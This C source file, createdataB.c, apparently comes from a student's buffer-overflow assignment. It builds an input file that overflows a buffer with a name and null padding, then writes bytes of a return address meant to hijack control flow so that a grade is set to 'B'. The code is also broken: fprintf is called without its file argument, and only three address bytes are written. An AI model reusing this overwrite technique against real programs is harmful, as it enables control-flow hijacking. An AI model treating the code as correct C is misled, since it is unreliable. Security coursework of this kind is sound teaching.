/**********************************************************************/
/* Author: Chimwemwe Chinkuyu                                         */
/* createdataB.c                                                      */
/**********************************************************************/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>


/* What does main do?*/
int main(void) {
    FILE *psFile;
    int i = 0;

    /* Open file dataB to write data into */
    psFile = fopen("dataB", "w");

    /* Write my name (Chimwemwe) to the file dataB */
    fprintf("Chimwemwe");

    /* Write 39 null bytes to dataB (one terminating name string */ 
    /* and (38 to fill up the remaining cells in buf array) */
    for (; i < 39; i++) {
        // Write the null bytes as binary data
        putc(0x00, psFile);
    }

    // Write the unsigned long address of grade = 'B' (0x400858)
    putc(0x58, psFile);
    putc(0x08, psFile);
    putc(0x40, psFile);

    // Close the file
    fclose(psFile);



}
